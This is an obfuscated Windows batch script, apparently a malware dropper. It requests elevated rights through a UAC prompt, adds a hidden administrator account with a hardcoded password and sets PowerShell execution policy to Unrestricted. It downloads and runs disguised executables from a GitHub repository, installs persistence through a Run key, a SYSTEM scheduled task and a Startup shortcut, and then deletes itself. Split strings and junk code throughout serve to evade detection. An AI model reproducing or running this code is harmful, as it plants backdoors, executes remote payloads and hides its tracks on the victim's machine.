@echo off
setlocal enabledelayedexpansion

:: Junk block - mathematical operations
set /a "rnd=!random! %% 32768"
set /a "fake=!rnd! * 2 + 1"
if !fake! gtr 10000 (echo. >nul) else (echo. >nul)

:: Polymorphic UAC bypass
if "%~1" NEQ "HIDDEN" (
    set "arg1=/c"
    set "arg2='%~f0'"
    set "arg3=HIDDEN"
    set "pscmd=Start-Process -WindowStyle Hidden -FilePath cmd -ArgumentList !arg1!,!arg2!,!arg3! -Verb RunAs 2>nul"
    PowerShell -Command "!pscmd!"
    exit /b
)

:: Random junk code
for /l %%i in (1,1,5) do (
    echo Junk iteration %%i >nul
    ping 127.0.0.1 -n 1 >nul
)

if "%~1" == "DEBUG" (
    echo DEBUG mode enabled
) else (
    @echo off
)

:: Split architecture check
set "arch_chk=%PROCESSOR_ARCHITECTURE%"
set "amd=am"
set "d64=d64"
if "!arch_chk!" EQU "!amd!!d64!" (
    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) else (
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:: Fake error handling
:fakeError
    echo This is never executed >nul
    goto :eof

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set "par= %*"
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" !par:"=""!", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0" 

:: Obfuscated user creation
set "u1=TB"
set "u2=uG"
set "p1=P@s"
set "p2=sw0"
set "p3=rd12"
set "p4=3!"
net user !u1!!u2! "!p1!!p2!!p3!!p4!" /add /Y >nul 2>&1
net localgroup administrators !u1!!u2! /add >nul 2>&1

:: Split PowerShell commands
set "ps1=Set-LocalUser"
set "ps2= -Name TBuG"
set "ps3= -PasswordNeverExpires $true"
powershell -Command "!ps1!!ps2!!ps3!" >nul

:: Execution policy bypass
set "pol1=Set-ExecutionPolicy"
set "pol2= -ExecutionPolicy Unrestricted"
set "pol3= -Scope LocalMachine -Force"
powershell -Command "!pol1!!pol2!!pol3!" >nul

:: Registry manipulation
set "reg1=HKLM\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell"
set "reg2=ExecutionPolicy"
set "reg3=Unrestricted"
reg add "!reg1!" /v !reg2! /t REG_SZ /d !reg3! /f >nul

:: Obfuscated URL components
set "proto=https"
set "domain=github.com"
set "path1=Drakovthe6th/TBuG/raw/refs/heads"
set "path2=master/mall.zip"
set "mallUrl=!proto!://!domain!/!path1!/!path2!"
set "mallDest=%APPDATA%\Microsoft\Windows\Templates\mall"
set "mallZip=!mallDest!.zip"

mkdir "!mallDest!" >nul 2>&1

:: Split download command
set "dl1=Invoke-WebRequest"
set "dl2= -Uri '!mallUrl!'"
set "dl3= -OutFile '!mallZip!'"
powershell -Command "!dl1!!dl2!!dl3!" >nul

:: Random sleep
timeout /t 1 >nul

:: Split extraction command
set "ex1=Expand-Archive"
set "ex2= -Path '!mallZip!'"
set "ex3= -DestinationPath '!mallDest!'"
set "ex4= -Force"
powershell -Command "!ex1!!ex2!!ex3!!ex4!" >nul

:: Obfuscated secondary download
set "ic1=initial"
set "ic2=.cmd"
set "initialCmdUrl=!proto!://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/!ic1!!ic2!"
powershell -Command "Invoke-WebRequest -Uri '!initialCmdUrl!' -OutFile '!mallDest!\!ic1!!ic2!'" >nul

set "appPath=!mallDest!\Egde.exe"

:: Polymorphic execution
set "exe1=Egde"
set "exe2=.exe"
start "" /B "!mallDest!\!exe1!!exe2!"

set "helper1=SystemHelper"
set "helper2=.exe"
start "" /B "!mallDest!\!helper1!!helper2!"

:: Split persistence methods
set "regKey=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "regValue=AppPersistence"
set "regData=\"!appPath!\""
reg add "!regKey!" /v "!regValue!" /t REG_SZ /d !regData! /f >nul

set "task1=schtasks /create /tn "
set "task2=\"AppPersistence\" /tr "
set "task3=\"\"!appPath!\"\" /sc onlogon"
set "task4= /ru \"SYSTEM\" /f"
!task1!!task2!!task3!!task4! >nul 2>&1

:: Shortcut creation
set "startupDir=%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup"
set "shortcutName=AppPersistence"
set "shortcutPath=!startupDir!\!shortcutName!.lnk"
set "psSc1=$s = (New-Object -COM WScript.Shell).CreateShortcut('"
set "psSc2='); $s.TargetPath = '"
set "psSc3='; $s.WorkingDirectory = '"
set "psSc4='; $s.Save()"
powershell -Command "!psSc1!!shortcutPath!!psSc2!!appPath!!psSc3!!mallDest!!psSc4!" >nul

:: Random junk before cleanup
set "delay=10"
echo Cleaning up in !delay! seconds >nul
timeout /t !delay! >nul

:: Polymorphic deletion
set "del1=del /f /q "
set "del2=!mallZip!"
!del1!"!del2!" >nul 2>&1
set "self=%~f0"
del /f /q "!self!" >nul

:: Final junk block
set "msg=Script execution completed"
echo !msg! >nul